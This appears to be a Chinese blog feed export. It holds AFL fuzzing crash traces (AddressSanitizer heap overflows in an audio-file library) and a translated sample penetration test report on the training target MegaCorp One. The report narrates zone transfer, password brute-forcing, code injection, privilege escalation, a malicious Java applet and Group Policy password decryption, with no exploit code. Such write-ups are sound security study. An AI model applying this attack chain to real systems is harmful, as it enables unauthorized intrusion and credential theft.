<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">**********************</span><br><span class="line">Running Example: Load Audio File and Print Summary</span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line">=================================================================</span><br><span class="line">==23==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000738 at pc 0x55da0cb245e9 bp 0x7ffc6e244e90 sp 0x7ffc6e244e80</span><br><span class="line">READ of size 1 at 0x602000000738 thread T0</span><br><span class="line">    #0 0x55da0cb245e8 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:379</span><br><span class="line">    #1 0x55da0cb226a7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::forward_iterator_tag) /usr/include/c++/10/bits/basic_string.tcc:225</span><br><span class="line">    #2 0x55da0cb1fba7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct_aux&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::__false_type) /usr/include/c++/10/bits/basic_string.h:247</span><br><span class="line">    #3 0x55da0cb1cfd5 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:266</span><br><span class="line">    #4 0x55da0cb19e45 in std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, void&gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::allocator&lt;char&gt; const&amp;) /usr/include/c++/10/bits/basic_string.h:628</span><br><span class="line">    #5 0x55da0cb11fcd in AudioFile&lt;float&gt;::decodeWaveFile(std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;&amp;) /src/AudioFile.h:502</span><br><span class="line">    #6 0x55da0cb0d359 in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:481</span><br><span class="line">    #7 0x55da0cb0554d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x55da0cb04d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7fede8fdb0b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line">    #10 0x55da0cb04c0d in _start (/src/asantry+0x4c0d)</span><br><span class="line"></span><br><span class="line">0x602000000738 is located 2 bytes to the right of 6-byte region [0x602000000730,0x602000000736)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x7fede95a2f17 in operator new(unsigned long) (/lib/x86_64-linux-gnu/libasan.so.6+0xb1f17)</span><br><span class="line">    #1 0x55da0cb1da08 in __gnu_cxx::new_allocator&lt;unsigned char&gt;::allocate(unsigned long, void const*) /usr/include/c++/10/ext/new_allocator.h:115</span><br><span class="line">    #2 0x55da0cb1ac79 in std::allocator_traits&lt;std::allocator&lt;unsigned char&gt; &gt;::allocate(std::allocator&lt;unsigned char&gt;&amp;, unsigned long) /usr/include/c++/10/bits/alloc_traits.h:460</span><br><span class="line">    #3 0x55da0cb16819 in std::_Vector_base&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_allocate(unsigned long) /usr/include/c++/10/bits/stl_vector.h:346</span><br><span class="line">    #4 0x55da0cb195b6 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_default_append(unsigned long) /usr/include/c++/10/bits/vector.tcc:635</span><br><span class="line">    #5 0x55da0cb11896 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::resize(unsigned long) /usr/include/c++/10/bits/stl_vector.h:940</span><br><span class="line">    #6 0x55da0cb0d192 in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:465</span><br><span class="line">    #7 0x55da0cb0554d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x55da0cb04d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7fede8fdb0b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/include/c++/10/bits/basic_string.h:379 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c047fff8090: fa fa fd fd fa fa fd fd fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80a0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80b0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80c0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80d0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">=&gt;0x0c047fff80e0: fa fa 00 02 fa fa 06[fa]fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff80f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==23==ABORTING</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二个heap buff overflowin位于AudioFile.h:1148，determineAudioFileFormat()函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./asantry ./out/default/crashes/id\:000000\,sig\:06\,src\:000006\,time\:291\,op\:havoc\,rep\:16</span><br></pre></td></tr></table></figure>

<p>asan结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">**********************</span><br><span class="line">Running Example: Load Audio File and Print Summary</span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line">=================================================================</span><br><span class="line">==13==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000731 at pc 0x561c434c55e9 bp 0x7ffeb0ea5a50 sp 0x7ffeb0ea5a40</span><br><span class="line">READ of size 1 at 0x602000000731 thread T0</span><br><span class="line">    #0 0x561c434c55e8 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:379</span><br><span class="line">    #1 0x561c434c36a7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::forward_iterator_tag) /usr/include/c++/10/bits/basic_string.tcc:225</span><br><span class="line">    #2 0x561c434c0ba7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct_aux&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::__false_type) /usr/include/c++/10/bits/basic_string.h:247</span><br><span class="line">    #3 0x561c434bdfd5 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:266</span><br><span class="line">    #4 0x561c434bae45 in std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, void&gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::allocator&lt;char&gt; const&amp;) /usr/include/c++/10/bits/basic_string.h:628</span><br><span class="line">    #5 0x561c434b2a75 in AudioFile&lt;float&gt;::determineAudioFileFormat(std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;&amp;) /src/AudioFile.h:1148</span><br><span class="line">    #6 0x561c434ae2ee in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:477</span><br><span class="line">    #7 0x561c434a654d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x561c434a5d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7f99260b30b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line">    #10 0x561c434a5c0d in _start (/src/asantry+0x4c0d)</span><br><span class="line"></span><br><span class="line">0x602000000731 is located 0 bytes to the right of 1-byte region [0x602000000730,0x602000000731)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x7f992667af17 in operator new(unsigned long) (/lib/x86_64-linux-gnu/libasan.so.6+0xb1f17)</span><br><span class="line">    #1 0x561c434bea08 in __gnu_cxx::new_allocator&lt;unsigned char&gt;::allocate(unsigned long, void const*) /usr/include/c++/10/ext/new_allocator.h:115</span><br><span class="line">    #2 0x561c434bbc79 in std::allocator_traits&lt;std::allocator&lt;unsigned char&gt; &gt;::allocate(std::allocator&lt;unsigned char&gt;&amp;, unsigned long) /usr/include/c++/10/bits/alloc_traits.h:460</span><br><span class="line">    #3 0x561c434b7819 in std::_Vector_base&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_allocate(unsigned long) /usr/include/c++/10/bits/stl_vector.h:346</span><br><span class="line">    #4 0x561c434ba5b6 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_default_append(unsigned long) /usr/include/c++/10/bits/vector.tcc:635</span><br><span class="line">    #5 0x561c434b2896 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::resize(unsigned long) /usr/include/c++/10/bits/stl_vector.h:940</span><br><span class="line">    #6 0x561c434ae192 in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:465</span><br><span class="line">    #7 0x561c434a654d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x561c434a5d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7f99260b30b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/include/c++/10/bits/basic_string.h:379 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c047fff8090: fa fa fd fd fa fa fd fd fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80a0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80b0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80c0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80d0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">=&gt;0x0c047fff80e0: fa fa 00 02 fa fa[01]fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff80f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==13==ABORTING</span><br></pre></td></tr></table></figure>




</li>
</ol>
]]></content>
      <categories>
        <category>AFL</category>
      </categories>
      <tags>
        <tag>AFL</tag>
      </tags>
  </entry>
  <entry>
    <title>penetration test report interpretation</title>
    <url>/2019/03/28/penetration-test-report-interpretation/</url>
    <content><![CDATA[<p><em>老师布置的一项任务，deploy丰富博客</em></p>
<hr>
<h2 id="渗透测试报告"><a href="#渗透测试报告" class="headerlink" title="渗透测试报告"></a>渗透测试报告</h2><p>目录<br>执行总结    3<br>结论总结    3<br>攻击记叙    3<br>远程系统调查    3<br>管理员网络服务器界面攻击    5<br>命令解析器到管理服务器    7<br>提权    9<br>JAVA客户机攻击    9<br>升级为本地管理员    11<br>深包检测规避    12</p>
<a id="more"></a>
<p>Citrix环境下的漏洞    14<br>升级为域管理员    17<br>总论    19<br>建议    20<br>风险等级    20<br>附录A：漏洞细节及减轻危害    21<br>风险等级范围    21<br>默认的或弱的凭证    21<br>密码重用    21<br>共享本地管理员密码    21<br>补丁管理    21<br>DNS区域传送    22<br>默认APACHE文件目录    22<br>附录B:关于Offensive Security    22</p>
<h2 id="执行总结"><a href="#执行总结" class="headerlink" title="执行总结"></a>执行总结</h2><p>为了检测经过一次蓄意攻击中后会出现什么问题，MegaCory One授权Offensive Security进行了这一次的渗透测试。我们有一个准则，就是为了模拟一个蓄意的攻击者，这个攻击者热衷于攻击MegaCory One的系统，并且我们要达到下列目的：</p>
<p>    确认远程攻击者能否破坏MegaCory One的防御系统<br>    确认攻击所带来的影响:<br>    公司重要数据是否泄露<br>    MegaCory One信息系统内部结构是否泄露以及是否可用</p>
<p>我们的工作主要是在确认和利用系统漏洞上，远程攻击者可以通过这些漏洞以未授权的方式获得一些重要数据。这些攻击方式可能一个只会上网的人也可以用。评估是按照NIST SP 800-115 中的标准下进行的，并且所有的测试都是可控的。</p>
<h2 id="结论总结"><a href="#结论总结" class="headerlink" title="结论总结"></a>结论总结</h2><p>对于MegaCorp One公司系统的第一次检测，就发现了一个错误配置的DNS服务器，其允许进行区域传送。这个漏洞给检测提供了许多可供攻击的主机。检查了这些主机后，发现一个受密码保护的网站服务器界面。我们通过穷举攻击爆出了密码从而能够进入网站，在建了符合网站密码的格式的随机字母表后。</p>
<p>这个管理界面非常脆弱，因为有一个远程代码注入漏洞，通过这个漏洞可以获得对底层操作系统访问的权限。因为没有正确的系统更新，而使最初的小问题变成了大问题。进一步检查后，发现管理用户可以在这个受损的服务器上运行着一个JAVA程序。当我们上传了恶意代码后，取得了访问权限。</p>
<p>利用这个服务器爆出的密码，我们能够访问先前不能访问的资源。这使得我们能够使用本地账户就可以登录许多的WINDOWS主机，一个CITRIX的服务器，还有对于WINDOWS活动目录完整的权限。通过将恶意流量封装进协议里，现有的恶意流量控制就可以避开。</p>
<h2 id="攻击记叙"><a href="#攻击记叙" class="headerlink" title="攻击记叙"></a>攻击记叙</h2><h3 id="远程系统调查"><a href="#远程系统调查" class="headerlink" title="远程系统调查"></a>远程系统调查</h3><p>为了更好的评估，MegaCorp One提供了很少的信息，除了组织的域名:megacorpone.com。这样做的目的是为了更符合一个没有得到内部信息的攻击者。为了避免攻击其他组织的系统，在攻击前，所有系统都进行了所有权验证。</p>
<p>我们检查了megacorpone.com域名的DNS服务器，查看有没有可能的攻击目标。</p>
<p>Figure 1-通过收集域名的信息找到了三个DNS服务器</p>
<p>利用这几个服务器，我们试着去进行区域传输。发现ns2.megacorpone.com的区域传输配置错误。这暴露了许多的主机名和其相关的IP地址，这非常有帮助。（Figure 2）区域传输提供给攻击者详细的信息，这个组织的职能，网段。详细请看附录A。</p>
<p>Figure 2-一个错误配置的DNS服务器，允许完整的五限制的区域传输</p>
<p>这些识别出的主机提交给了MegaCorp One确认，确定整个50.7.67.X网段都要在评估范围内。这些主机会被扫描，接着列举出所有正在运行的服务。为了确定这些服务器潜在的漏洞，它们会被仔细的检查。</p>
<p>通过枚举技术和网络扫描，可以建立一个映射MegaCorp One网络的结构。</p>
<p>在Figure 3中展示了目标网络结构。例如深包检查这样的额外控制细节，会在接下来的评估中提到，这里为完整性，先说一点。</p>
<p>Figure 3-目标网络</p>
<p>管理员网络服务器界面攻击<br>Admin.megacorpone.com服务器在81端口上运行着Apache服务。通过站点的根URL访问，发现了一个空白页面。接下来，进行一次快速的枚举扫描，以期找到公用目录和文件。（Figure 4）</p>
<p>Figure 4-admin.megacorpone.com的枚举攻击揭露了网站的文件结构</p>
<p>扫面的结果显示没有改变Apache公共默认目录(详细请看附录A)，我们确定/admin是唯一可通过身份验证的目录。（Figure 5）</p>
<p>Figure 5-admin目录受密码保护</p>
<p>我们定作了一个基于该网站内容的字典文件，为了暴力破解密码。最初的字典包括了331个特意字符串，通过几轮置换，形成了有16201个字符串的字典文件。用admin的用户名和这个字典来暴力破解。</p>
<p>Figure 6-使用字典攻击来获得管理员密码</p>
<p>暴力攻击找到了admin用户的密码”nanotechnology1”。利用这个账户就能一未授权的方式得到网站受保护部分的内容。（Figure 6）详细请看附录A，怎么利用这个漏洞。</p>
<p>这里面有一个SQLite Manager服务界面，无需任何凭证就可以访问。利用这个界面，发现支持phpSQLiteCMS实例的数据库。<a href="http://phpsqlitecms.net/">http://phpsqlitecms.net/</a></p>
<p>Figure 7-网站运行着SQLite数据库<br> <br>通过这个界面就可以获得数据，比如用户名，以及相关的密码哈希值。（Figure 8）</p>
<p>Figure 8-缺少额外的设置，攻击者可以很方便地获得数据，从”userdata”这个数据库</p>
<p>表中的密码hash值不符合任何标准的格式。使用一个叫”phpselitecms”的软件，查看源代码以确定hash值是怎么产生的。可以看到这个函数的功能是hash账户的密码。</p>
<p>Figure 9-查看源码发现密码hash生成算法</p>
<p>知道了密码hash的格式，还有随意生成的十个字符的salt值，可以将这些hash值转变成等价的加了salt的SHA1值，进行暴力攻击。</p>
<p>得到了两个明文密码，尽管不是立马就有用，但可能在组织里其他的系统中可以用到。</p>
<h3 id="命令解析器到管理服务器"><a href="#命令解析器到管理服务器" class="headerlink" title="命令解析器到管理服务器"></a>命令解析器到管理服务器</h3><p>先前发现的SQLite Manager有一个著名的代码注入漏洞。(<a href="https://www.exploit-db.com/exploits/24320)%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97shell%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E3%80%82%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E6%94%B9%E8%89%AF%E8%BF%87%E7%9A%84%E5%85%AC%E5%85%B1%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BA%93%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0admin.megacorpone.com%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%9C%89%E9%99%90%E7%9A%84%E4%BA%A4%E4%BA%92%E6%9D%83%E3%80%82%E8%AF%A6%E7%BB%86%E8%AF%B7%E7%9C%8B%E9%99%84%E5%BD%95A">https://www.exploit-db.com/exploits/24320)利用这个漏洞可以获得shell，进入网站服务器用户使用的系统。使用一个改良过的公共漏洞利用库，可以得到admin.megacorpone.com服务器上有限的交互权。详细请看附录A</a>.</p>
<p>Figure 10-利用一个公开的可用的SQLite漏洞，就能以未授权的方式进入系统</p>
<p>Figure 11-只能取得www-data这个用户的权限</p>
<p>MegaCorp One使用的SQLite Manager的版本和该存在该漏洞的版本有一些不同。尽管使用的版本也同样存在相同的底层问题，但在没有修正的情况下，这个漏洞不能发挥作用。所以我们添加了功能，让它支持HTTP认证，适合于新版本的SQLite Manager。这个新的漏洞随后会发布出去。</p>
<p>在图12中可以看到方案的内容。</p>
<p>Figure 12-网络服务器的攻击方案
 </p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>当得到了底层系统的交互权后，我们继续寻找可以提升权限的方法。随后，找到了一个可以可以利用的提权的漏洞。(<a href="http://www.exploit-db.com/exploits/18411/)%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E8%AF%B7%E7%9C%8B%E9%99%84%E5%BD%95A%E3%80%82">http://www.exploit-db.com/exploits/18411/)详细信息请看附录A。</a></p>
<p>Figure 13-使用一个提权的漏洞，该主机没有打补丁，所以可以用</p>
<p>因为上传了漏洞利用工具，所以让利用该漏洞有一定的可行性。如果没有这些工具，还是由可能成功提权的，尽管这么做工作量会大大增加。</p>
<p>服务器有许多漏洞，可以给攻击者很多机会，如果不补救的话。有了管理员的权限，攻击者可以做很多的事，既可以攻击MegaCorp One自己，也可以攻击它的用户。当然，很大的可能是同时做这两件事情。</p>
<h3 id="JAVA客户机攻击"><a href="#JAVA客户机攻击" class="headerlink" title="JAVA客户机攻击"></a>JAVA客户机攻击</h3><p>登录管理员账户，分析该系统。找到了网站的一个私有部分，这个部分给一些特殊的工作站运行一个Java小程序。这个有问题的网段后来被发现是MwgaCorp One的管理网段。</p>
<p>Figure 14-Htaccess规则暴露了该网络的一个子网</p>
<p>通过查看log文件和Java小程序的运行方式，发现这个程序给MegaCorp One子网内部用户提供了管理员功能。这对攻击者来说非常有利，因为它提供了进入内网的可能方法，如果没有这个程序，进入内网会很困难。</p>
<p>获得了MegaCorp One的许可后，我们添加了一个可被客户机下载的小程序。攻击的原理是让客户机信任这个程序，允许运行，就可以连接到其他的客户机。这是普通的社会工程攻击的衍生品，所谓社会工程学攻击，就是让受害者主动去运行一个有害的程序。在这个例子中，不用去误导受害者，因为这个程序早已被认为是可信的。</p>
<p>正如所料，可以连接上其他客户机。</p>
<p>Figure 15-利用恶意的java小程序，可以操纵主机</p>
<p>在适当的地方实施该方案，可以得到管理员网络的系统权限，见图16。</p>
<p>Figure 16-Java小程序成功攻击</p>
<h3 id="升级为本地管理员"><a href="#升级为本地管理员" class="headerlink" title="升级为本地管理员"></a>升级为本地管理员</h3><p>Java小程序的攻击只能提供一般用户的权限。为了能做更多的事，需要逐步提升权限，成为域管理员。首先，要获得本地管理权限。要达成这一目的，先检查系统看看有什么漏洞。</p>
<p>发现一个组策略首选项文件，其允许用户解密本地管理员密码。(<a href="http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)%E8%AF%A6%E6%83%85%E8%AF%B7%E7%9C%8B%E9%99%84%E5%BD%95A%E3%80%82">http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)详情请看附录A。</a></p>
<p>Figure 17-利用这个漏洞，可以获得域控制器的Groups.xml文件</p>
<p>Figure 18-在Groups.xml中包含加密的本地管理员密码</p>
